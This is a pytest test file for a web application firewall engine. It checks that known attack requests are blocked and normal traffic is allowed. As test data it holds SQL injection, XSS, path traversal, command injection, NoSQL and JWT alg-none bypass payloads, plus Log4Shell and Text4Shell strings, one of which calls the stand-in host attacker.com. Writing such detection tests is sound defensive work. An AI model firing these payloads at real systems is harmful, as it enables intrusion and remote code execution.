"""Tests for app.waf_engine — known attack snapshots -> expected BLOCK/ALLOW + attack_type."""

import asyncio

import pytest

from app import waf_engine


NORMAL_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                   '(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate',
}

_ip_counter = 0


def _next_ip():
    """Each test gets a fresh IP so rate-limiter / anti-bot velocity state
    from other tests doesn't bleed in."""
    global _ip_counter
    _ip_counter += 1
    return f'198.51.100.{_ip_counter}'


def _request(method='GET', url='/', headers=None, body='', ip=None):
    return {
        'method': method,
        'url': url,
        'headers': {**NORMAL_HEADERS, **(headers or {})},
        'body': body,
        'ip': ip or _next_ip(),
    }


def _analyze(request_data):
    return asyncio.run(waf_engine.analyze(request_data))


@pytest.fixture(autouse=True)
def reset_engine_state():
    waf_engine.reset_stats()
    yield
    waf_engine.reset_stats()


# ── Normal traffic ───────────────────────────────────────────────────────────

def test_normal_get_request_is_allowed():
    result = _analyze(_request(url='/tienda1/publico/productos.jsp?id=1&page=2'))
    assert result['decision'] == 'ALLOW'
    assert result['attack_type'] == 'normal'
    assert result['blocked_by'] is None


def test_normal_post_json_request_is_allowed():
    result = _analyze(_request(
        method='POST', url='/rest/user/login',
        headers={'Content-Type': 'application/json'},
        body='{"email":"user@example.com","password":"hunter2"}',
    ))
    assert result['decision'] == 'ALLOW'


# ── SQL Injection ────────────────────────────────────────────────────────────

def test_sqli_tautology_is_blocked():
    result = _analyze(_request(url="/login?user=admin&pass=' OR '1'='1"))
    assert result['decision'] == 'BLOCK'
    assert result['attack_type'] == 'sqli'


def test_sqli_union_select_is_blocked():
    result = _analyze(_request(
        url="/products?id=1 UNION SELECT username,password FROM users--"
    ))
    assert result['decision'] == 'BLOCK'
    assert result['attack_type'] == 'sqli'


# ── XSS ──────────────────────────────────────────────────────────────────────

def test_xss_script_tag_is_blocked():
    result = _analyze(_request(url="/search?q=<script>alert(document.cookie)</script>"))
    assert result['decision'] == 'BLOCK'
    assert result['attack_type'] == 'xss'


# ── Path traversal ───────────────────────────────────────────────────────────

def test_path_traversal_is_blocked():
    result = _analyze(_request(url="/download?file=../../../../etc/passwd"))
    assert result['decision'] == 'BLOCK'
    assert result['attack_type'] == 'path_traversal'


# ── Command injection ────────────────────────────────────────────────────────

def test_cmd_injection_is_blocked():
    result = _analyze(_request(url="/ping?host=localhost; cat /etc/passwd"))
    assert result['decision'] == 'BLOCK'
    assert result['attack_type'] == 'cmd_injection'


# ── NoSQL injection (dedicated middleware, stage 6) ──────────────────────────

def test_nosql_injection_is_blocked():
    result = _analyze(_request(
        method='POST', url='/login',
        headers={'Content-Type': 'application/json'},
        body='{"username": {"$ne": null}, "password": {"$ne": null}}',
    ))
    assert result['decision'] == 'BLOCK'
    assert result['attack_type'] == 'nosql_injection'
    assert result['blocked_by'] == 'nosql_injection'


# ── JWT abuse (dedicated middleware, stage 7) ────────────────────────────────

def test_jwt_alg_none_is_blocked():
    token = (
        'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.'
        'eyJpZCI6MSwicm9sZSI6ImFkbWluIn0.'
    )
    result = _analyze(_request(
        url='/rest/user/whoami',
        headers={'Authorization': f'Bearer {token}'},
    ))
    assert result['decision'] == 'BLOCK'
    assert result['attack_type'] == 'jwt_abuse'
    assert result['blocked_by'] == 'jwt_abuse'


# ── IPS signatures ────────────────────────────────────────────────────────────

def test_log4shell_jndi_payload_is_blocked():
    result = _analyze(_request(
        url='/api/login',
        headers={'X-Api-Version': '${jndi:ldap://attacker.com/a}'},
    ))
    assert result['decision'] == 'BLOCK'
    assert result['blocked_by'] == 'ips'


def test_text4shell_script_interpolation_is_blocked():
    result = _analyze(_request(
        method='POST', url='/api/profile',
        headers={'Content-Type': 'application/json'},
        body='{"name": "${script:javascript:java.lang.Runtime.getRuntime().exec(\'id\')}"}',
    ))
    assert result['decision'] == 'BLOCK'
    assert result['blocked_by'] == 'ips'


# ── Anti-bot ──────────────────────────────────────────────────────────────────

def test_known_scanner_ua_is_blocked():
    result = _analyze(_request(url='/admin', headers={'User-Agent': 'sqlmap/1.7.8#stable'}))
    assert result['decision'] == 'BLOCK'
    assert result['blocked_by'] == 'anti_bot'


# ── Stats tracking ────────────────────────────────────────────────────────────

def test_stats_track_blocked_and_allowed_counts():
    _analyze(_request(url='/tienda1/publico/productos.jsp'))
    _analyze(_request(url="/login?user=admin&pass=' OR '1'='1"))

    stats = waf_engine.get_stats()
    assert stats['total'] == 2
    assert stats['blocked'] == 1
    assert stats['allowed'] == 1
    assert stats['attack_counts'].get('sqli') == 1
